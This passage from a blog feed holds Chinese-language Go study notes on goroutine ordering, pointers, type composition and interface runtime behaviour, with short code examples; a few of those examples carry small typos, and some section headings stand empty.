的执行规则所导致的。</p><p>创建 goroutine 是需要时间的，for 语句执行并不会停下来等待一个 goroutine 创建完成之后再开始下一次遍历。</p><p>因为这种异步并发执行的特性，10 个 goroutine 全部被创建完成之后，在队列中的顺序可能有 N 中组合，所以最后通过另一个 for 语句，依次从 channel 取出打印时，i 的值绝大多数情况下不是顺序的。</p><p>可以结合下图进行理解：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/GPM%E6%A8%A1%E5%9E%8B.jpg" alt=""><br>还有比 channel 更好的方式可以实现，比如 <code>sync.WaitGroup</code>，这里先不过多介绍，在后面的笔记中再详细讲解。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>并发：逻辑上具备同时处理多个任务的能力</li><li>并行：物理上在同一时刻执行多个并发任务</li><li>单核 CPU 同一时刻只能执行一个程序，各个程序只能并发地运行</li><li>多核 CPU 同一时刻可以同时执行多个程序，多个程序可以并行地运行</li><li>并行的必要条件是具有多个处理器或多核处理器，否则无论是否是并发的设计，程序执行时都有且仅有一个任务可以被调度到处理器上执行</li><li>goroutine 在逻辑处理器上执行，而逻辑处理器具有独立的系统线程和运行队列</li><li>关键字 go + 函数并不是表示直接并发执行该函数，而是创建一个 goroutine</li><li>一旦main goroutine 退出了，当前 Go 程序就会结束运行</li><li>Go 不会保证 goroutine 的执行顺序，如果希望按照某个预期顺序执行，则需要“人为干预”</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——指针</title>
      <link href="/go-language-study-notes-pointer/"/>
      <url>/go-language-study-notes-pointer/</url>
      
        <content type="html"><![CDATA[<p>区别于 C/C++ 的指针，Go 语言的指针不能进行偏移和运算，因此是安全指针。</p><a id="more"></a><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p>一个变量在内存中，可以分为两部分：编址（变量的地址）和具体的值。</p><p>在概念上，Go 语言的指针和 C 语言一样，当一个变量的值存储的值是其他变量的地址，那么它就是一个指针变量。</p><p>所以也可以说<strong>指针的本质就是地址</strong>。</p><h3 id="操作指针"><a href="#操作指针" class="headerlink" title="操作指针"></a>操作指针</h3><p>前面提到过，因为 Go 语言的指针不能进行偏移和运算，因此指针的使用场景就只有传递了，只需要记住两个操作符即可：</p><ul><li><code>&amp;</code>：取址符，也称为引用，通过该操作符可以获取一个变量的地址值。</li><li><code>*</code>：取值符，也称为解引用，通过该操作符可以获取一个地址对应的值。</li></ul><h3 id="指针的类型"><a href="#指针的类型" class="headerlink" title="指针的类型"></a>指针的类型</h3><p>每个变量在内存中都有一个属于自己的地址，不同类型的数据，都可以拥有自己的指针，比如：</p><ul><li><code>int</code> =&gt; <code>*int</code>，也叫整型指针</li><li><code>string</code> =&gt; <code>*string</code>，也叫字符串指针</li><li><code>struct</code> =&gt; <code>*struct</code>，也叫结构体指针</li><li>…</li></ul><p>无论是什么类型，占用的内存都一样（32位4个字节, 64位8个字节）。</p><h2 id="指针在内存中的表示"><a href="#指针在内存中的表示" class="headerlink" title="指针在内存中的表示"></a>指针在内存中的表示</h2><p>按照惯例先来看一段示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  x := <span class="number">10</span></span><br><span class="line">p := &amp;x</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印变量 a 的值和变量 a 的地址</span></span><br><span class="line">  fmt.Printf(<span class="string">"x: %d, ptr: %p, T: %T \n"</span>, x, &amp;x, x)</span><br><span class="line"><span class="comment">// 打印变量 b 的值和变量 b 的地址，因为变量b，本身是一个整型指针，不需要再次取址</span></span><br><span class="line">  fmt.Printf(<span class="string">"p: %d, ptr: %p , T: %T \n"</span>, *p, p, p)</span><br><span class="line">fmt.Println(&amp;p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行示例代码，输出以下结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x: <span class="number">10</span>, ptr: <span class="number">0xc0000b2008</span>, T: <span class="keyword">int</span> </span><br><span class="line">p: <span class="number">10</span>, ptr: <span class="number">0xc0000b2008</span> , T: *<span class="keyword">int</span> </span><br><span class="line"><span class="number">0xc0000ac018</span></span><br></pre></td></tr></table></figure><p>在上面的示例代码中，变量 x 通过取址符，获取到自己的编址并赋值给变量 p，因此变量 p 就是一个指针变量，其类型为整型，也可以说变量 p 就是一个整型指针。</p><p>因为变量 p 是一个指针变量，所以它也拥有自己的地址，而它的值则是变量 x 的地址。</p><p>下面用一张图来解释它们之间的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/Go%E6%8C%87%E9%92%88.jpg" alt=""></p><p><code>&amp;</code> 符号的作用是获取变量的地址，<code>*</code> 符号的作用是通过变量的地址获取对应的值。</p><h2 id="指针作为函数参数和返回值"><a href="#指针作为函数参数和返回值" class="headerlink" title="指针作为函数参数和返回值"></a>指针作为函数参数和返回值</h2><p>指针传递的场景还包括作为函数参数和返回值，下面一一来看下，这两种场景下，都有哪些特点。</p><h3 id="作为函数参数"><a href="#作为函数参数" class="headerlink" title="作为函数参数"></a>作为函数参数</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">a <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">(t *T)</span></span> &#123;</span><br><span class="line">t.a = <span class="number">11</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> t1 T</span><br><span class="line"><span class="built_in">println</span>(t1.a)</span><br><span class="line">F(t1)</span><br><span class="line"><span class="built_in">println</span>(t1.a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，会发现编译失败了：</p><blockquote><p>cannot use t1 (variable of type T) as type *T in argument to F</p></blockquote><p>因为函数 F 接收一个指针作为参数，但是传进去的 t1 并不是一个结构体指针，而是一个结构体，类型不一致，所以导致编译失败。</p><p>要解决这个问题很简单，只需要保证形参和实参的类型一致即可，使用 <code>&amp;</code> 取址符将 t1 的地址作为参数传入：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F(&amp;t1)</span><br></pre></td></tr></table></figure><p>再次运行示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>形参与实参的类型必须一致，否则会编译失败</li><li>对形参进行任何修改都会影响到实参</li></ul><h3 id="作为返回值"><a href="#作为返回值" class="headerlink" title="作为返回值"></a>作为返回值</h3><h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><p>在<a href="https://www.0x2beace.com/go-language-study-notes-receiver/">方法的 receiver 参数</a>这篇笔记中，当时遇到了一个 Go编译器做指针自动转换的场景，有了上面的基础做铺垫就不难理解了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">      a <span class="keyword">int</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;</span><br><span class="line">      t.a = <span class="number">10</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;</span><br><span class="line">     t.a = <span class="number">11</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">     <span class="keyword">var</span> t1 T</span><br><span class="line">     <span class="built_in">println</span>(t1.a) <span class="comment">// 0</span></span><br><span class="line">     t1.M1()</span><br><span class="line">     <span class="built_in">println</span>(t1.a) <span class="comment">// 0</span></span><br><span class="line">     t1.M2()</span><br><span class="line">     <span class="built_in">println</span>(t1.a) <span class="comment">// 11</span></span><br><span class="line"> </span><br><span class="line">     <span class="keyword">var</span> t2 = &amp;T&#123;&#125;</span><br><span class="line">     <span class="built_in">println</span>(t2.a) <span class="comment">// 0</span></span><br><span class="line">     t2.M1()</span><br><span class="line">     <span class="built_in">println</span>(t2.a) <span class="comment">// 0</span></span><br><span class="line">     t2.M2()</span><br><span class="line">     <span class="built_in">println</span>(t2.a) <span class="comment">// 11</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>t1 作为一个结构体（非指针），理论上是不能直接调用 receiver 参数类型 <code>*T</code>（指针）的 M2，Go 编译器在背后做了自动转换，使用 <code>&amp;</code> 取址符将t1 变成了结构体指针，也就是 <code>(&amp;t1).M2()</code>。</p><p>同理，t2 作为一个结构体指针（指针），理论上是不能直接调用 receiver 参数类型 <code>T</code>（非指针）的 M1，同样是Go 编译器在背后做了自动转换，使用 <code>*</code> 取值符将t2 变成了结构体，也就是 <code>(*t2).M1()</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——组合</title>
      <link href="/go-language-study-notes-combination/"/>
      <url>/go-language-study-notes-combination/</url>
      
        <content type="html"><![CDATA[<p>前面两篇有关接口的笔记介绍了Go 接口的基本知识、接口类型定义的惯例以及接口在运行时的表示。</p><a id="more"></a><p>这篇笔记来学习一下，如何使用接口，不过，这里的“如何使用”，指的是学习如何利用接口进行应用设计，换句话说就是<strong>Go 接口的应用模式或惯例</strong>。</p><p><strong>在实际真正需要的时候才对程序进行抽象。不要为了抽象而抽象</strong>。</p><h2 id="一切皆组合"><a href="#一切皆组合" class="headerlink" title="一切皆组合"></a>一切皆组合</h2><p>组合是 Go 语言的重要设计哲学之一，而正交性则为组合哲学的落地提供了更为方便的条件。</p><p>正交（Orthogonality）是从几何学中借用的术语，说的是如果两条线以直角相交，那么这两条线就是正交的。</p><p>编程语言的语法元素间和语言特性也存在着正交的情况，并且通过将这些正交的特性组合起来，可以实现更为高级的特性。</p><p>在语言设计层面，Go 语言就为广大 Gopher 提供了诸多正交的语法元素供后续组合使用，包括：</p><ul><li>Go 语言无类型体系，没有父子类的概念，类型定义是正交独立的</li><li>方法和类型是正交的，每种类型都可以拥有自己的方法集合，方法本质上只是一个将 receiver 参数作为第一个参数的函数而已</li><li>接口与它的实现者之间无“显式关联”，也就说接口与 Go 语言其他部分也是正交的</li></ul><p>在这些正交语法元素中，接口作为 Go 语言提供的具有天然正交性的语法元素，在 Go 程序的静态结构搭建与耦合设计中扮演着至关重要的角色。而要想知道接口究竟扮演什么角色，我们就先要了解组合的方式。</p><p>构建 Go 应用程序的静态骨架结构有两种主要的组合方式，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221109152526.png" alt=""></p><p>下面分别介绍垂直组合和水平组合。</p><h2 id="垂直组合"><a href="#垂直组合" class="headerlink" title="垂直组合"></a>垂直组合</h2><p>垂直组合更多用在<strong>将多个类型，通过类型嵌入的方式实现新类型的定义</strong>。</p><p>传统面向对象变成语言大多是通过继承的方式构建出自己的类型体系，但 Go 语言并没有类型体系的概念。</p><p>Go 语言通过<strong>类型的组合而不是继承让单一类型承载更多的功能</strong>。</p><p>因为不是继承，也就没有了面向对象中的“父子关系”的概念了，也没有向上、向下转型（Type Casting），被嵌入的类型也不知道将其嵌入的外部类型的存在。<strong>调用方法时，方法的匹配取决于方法名字，而不是类型</strong>。</p><h3 id="嵌入接口构建接口类型"><a href="#嵌入接口构建接口类型" class="headerlink" title="嵌入接口构建接口类型"></a>嵌入接口构建接口类型</h3><p>在接口中嵌入接口，实现接口行为聚合，组成大接口。这种方式在标准库中非常常见，也是 Go 接口类型定义的惯例。</p><p>比如标准库中的 ReadWriter 接口类型的定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/io/io.go</span></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">    Reader</span><br><span class="line">    Writer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌入接口构建结构体类型"><a href="#嵌入接口构建结构体类型" class="headerlink" title="嵌入接口构建结构体类型"></a>嵌入接口构建结构体类型</h3><p>在结构体类型中嵌入接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyReader <span class="keyword">struct</span> &#123;</span><br><span class="line">  io.Reader <span class="comment">// underlying reader</span></span><br><span class="line">  N <span class="keyword">int64</span>   <span class="comment">// max bytes remaining</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在结构体中嵌入接口，会包含嵌入的接口类型的方法集合，可以用于快速构建满足某一个接口的结构体类型。</p><h3 id="嵌入结构体构建结构体类型"><a href="#嵌入结构体构建结构体类型" class="headerlink" title="嵌入结构体构建结构体类型"></a>嵌入结构体构建结构体类型</h3><p>在结构体中嵌入接口类型名和在结构体中嵌入其他结构体，都是“委派模式（delegate）”的一种应用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInt <span class="keyword">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *MyInt)</span> <span class="title">Add</span><span class="params">(m <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    *n = *n + MyInt(m)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123;</span><br><span class="line">    *MyInt</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := MyInt(<span class="number">17</span>)</span><br><span class="line">    r := strings.NewReader(<span class="string">"hello, go"</span>)</span><br><span class="line">    s := S&#123;</span><br><span class="line">        MyInt: &amp;m,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sl = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(<span class="string">"hello, go"</span>))</span><br><span class="line">    s.Add(<span class="number">5</span>)</span><br><span class="line">    fmt.Println(*(s.MyInt)) <span class="comment">// 22</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体实例 s 本身没有定义 Add 方法，于是会查看 S 的嵌入字段对应的类型是否定义了 Read 方法，找到之后，<code>s.Add</code> 的调用就被转换为 <code>s.MyInt.Add</code> 调用。</p><h2 id="水平组合"><a href="#水平组合" class="headerlink" title="水平组合"></a>水平组合</h2><p>水平组合就是通过接口将各个垂直组合出的类型“耦合”在一起。</p><p>通过接口进行水平组合的基本模式就是：<strong>使用接受接口类型参数的函数或方法</strong>。</p><p>在这个基本模式基础上，还有几种“衍生品”，下面一一介绍。</p><h3 id="基本模式"><a href="#基本模式" class="headerlink" title="基本模式"></a>基本模式</h3><p>接受接口类型参数的函数或方法是水平组合的基本语法，形式是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">YourFuncName</span><span class="params">(param YourInterfaceType)</span></span></span><br></pre></td></tr></table></figure><p>套用骨架关节的概念，用这幅图来表示上面基本模式语法的运用方法：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221109160229.png" alt=""></p><p>函数 / 方法参数中的接口类型作为“连接点”，支持将位于多个包中的多个类型与 YourFuncName 函数连接到一起，共同实现某一新特性。</p><h3 id="创建模式"><a href="#创建模式" class="headerlink" title="创建模式"></a>创建模式</h3><p>Go 社区流传一个经验法则：“接受接口，返回结构体（Accept interfaces, return structs）”，这其实就是一种把接口作为“连接点”的应用模式。</p><p>下面是 Go 标准库中，运用创建模式创建结构体实例的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/sync/cond.go</span></span><br><span class="line"><span class="keyword">type</span> Cond <span class="keyword">struct</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    L Locker</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCond</span><span class="params">(l Locker)</span> *<span class="title">Cond</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;Cond&#123;L: l&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $GOROOT/src/log/log.go</span></span><br><span class="line"><span class="keyword">type</span> Logger <span class="keyword">struct</span> &#123;</span><br><span class="line">    mu     sync.Mutex </span><br><span class="line">    prefix <span class="keyword">string</span>     </span><br><span class="line">    flag   <span class="keyword">int</span>        </span><br><span class="line">    out    io.Writer  </span><br><span class="line">    buf    []<span class="keyword">byte</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(out io.Writer, prefix <span class="keyword">string</span>, flag <span class="keyword">int</span>)</span> *<span class="title">Logger</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;Logger&#123;out: out, prefix: prefix, flag: flag&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上面 log 包的 New 函数为例，这个函数用于实例化一个 log.Logger 实例，它接受一个 io.Writer 接口类型的参数，返回 *log.Logger。从 New 的实现上来看，传入的 out 参数被作为初值赋值给了 log.Logger 结构体字段 out。</p><p>创建模式通过接口，在 NewXXX 函数所在包与接口的实现者所在包之间建立了一个连接。</p><p>大多数包含接口类型字段的结构体的实例化，都可以使用创建模式实现。</p><h3 id="包装器模式"><a href="#包装器模式" class="headerlink" title="包装器模式"></a>包装器模式</h3><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><h2 id="尽量避免使用空接口作为函数参数类型"><a href="#尽量避免使用空接口作为函数参数类型" class="headerlink" title="尽量避免使用空接口作为函数参数类型"></a>尽量避免使用空接口作为函数参数类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/io/io.go</span></span><br><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</span><br><span class="line">  Read(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go 编译器通过解析这个接口定义，得到接口的名字信息以及它的方法信息，在为这个接口类型参数赋值时，编译器就会根据这些信息对实参进行检查。</p><p>可是，如果函数或方法的参数类型为空接口<code>interface{}</code>，编译器无法得知实参的任何信息，因此只有到运行时才能发现错误。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Go 语言通过类型嵌入（Type Embedding）实现垂直组合</li><li>水平组合就是通过接口将各个垂直组合出的类型“耦合”在一起，有多种模式</li><li>尽量不要使用可以“逃过”编译器类型安全检查的空接口类型 <code>interface{}</code></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——接口运行时表示</title>
      <link href="/go-language-study-notes-interface-runtime-representation/"/>
      <url>/go-language-study-notes-interface-runtime-representation/</url>
      
        <content type="html"><![CDATA[<p>接口在 Go 中的地位非常高，这是因为接口是 Go 这门静态语言中唯一“动静兼容”的语法特性。</p><a id="more"></a><h2 id="静态特性与动态特性"><a href="#静态特性与动态特性" class="headerlink" title="静态特性与动态特性"></a>静态特性与动态特性</h2><p>接口的静态特性体现在<strong>接口类型变量具有静态类型</strong>。\</p><p>拥有静态类型意味着<strong>编译器会在编译阶段对所有接口类型变量的赋值操作进行类型检查，编译器会检查右值的类型是否实现了该接口方法集合的所有方法</strong>，如果没有实现，则会编译失败。而不是等到运行时才会检查。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err error = <span class="number">1</span> <span class="comment">// cannot use 1 (type int) as type error in assignment: int does not implement error (missing Error method)</span></span><br></pre></td></tr></table></figure><p>接口的动态体现在接口类型变量在运行时还<strong>存储了右值的真实类型信息，这个右值的真实类型信息被称为接口类型变量的动态类型</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">err = error.New(<span class="string">"error1"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%T \n"</span>, err)   <span class="comment">// *errors.errorString</span></span><br></pre></td></tr></table></figure><p>从上面的示例代码中可以看到，err 接口类型变量是 <code>errors.New</code> 构造的一个错误值，借助 <code>fmt.Printf</code> 函数输出了接口类型变量的动态类型是 <code>*errors.errorString</code>。</p><h2 id="动静兼容的特性有什么好处"><a href="#动静兼容的特性有什么好处" class="headerlink" title="动静兼容的特性有什么好处"></a>动静兼容的特性有什么好处</h2><p>接口类型变量在程序运行时，可以被赋值为不同的动态类型变量，每次赋值后，接口类型变量中存储的动态类型信息都会发生变化，这让 Go 语言可以像动态语言（Python）那样拥有鸭子类型（Duck Typing）的灵活性。</p><blockquote><p>什么是鸭子类型？</p></blockquote><p>就是指某类型所表现出的特性（比如是否可以作为某接口类型的右值），不是由其基因（比如 C++ 中的父类）决定的，而是由类型所表现出来的行为（比如类型拥有的方法）决定的。</p><p>比如下面的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> QuackableAnimal <span class="keyword">interface</span> &#123;</span><br><span class="line">    Quack()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Duck <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Duck)</span> <span class="title">Quack</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"duck quack!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Dog)</span> <span class="title">Quack</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"dog quack!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Bird <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Bird)</span> <span class="title">Quack</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"bird quack!"</span>)</span><br><span class="line">&#125;                         </span><br><span class="line">                          </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AnimalQuackInForest</span><span class="params">(a QuackableAnimal)</span></span> &#123;</span><br><span class="line">    a.Quack()             </span><br><span class="line">&#125;                         </span><br><span class="line">                          </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;             </span><br><span class="line">    animals := []QuackableAnimal&#123;<span class="built_in">new</span>(Duck), <span class="built_in">new</span>(Dog), <span class="built_in">new</span>(Bird)&#125;</span><br><span class="line">    <span class="keyword">for</span> _, animal := <span class="keyword">range</span> animals &#123;</span><br><span class="line">        AnimalQuackInForest(animal)</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，使用接口类型 <code>QuackableAnimal</code> 来代表具有“会叫”（<code>Quack()</code>方法）这一特征的动物，而 Duck、Bird 和 Dog 类型各自都具有这样的特征，</p><p>这里的 Duck、Bird、Dod 都是“鸭子类型”，它们之间并没有什么联系，之所以能作为右值赋值给 QuackableAnimal 类型变量，只是因为他们表现出了 QuackableAnimal 所要求的特征罢了，也就是拥有 <code>Quack()</code> 方法，而不需要严格的继承体系。</p><p>与动态语言不同的是，Go 接口还可以保证“动态特性”使用时的安全性。比如，编译器在编译期就可以捕捉到将 int 类型变量传给 QuackableAnimal 接口类型变量这样的明显错误，决不会让这样的错误遗漏到运行时才被发现。</p><h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><p>接下来通过一个问题来更深入认识一下动静特性。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyError <span class="keyword">struct</span> &#123;</span><br><span class="line">    error</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ErrBad = MyError&#123;</span><br><span class="line">    error: errors.New(<span class="string">"bad things happened"</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bad</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnsError</span><span class="params">()</span> <span 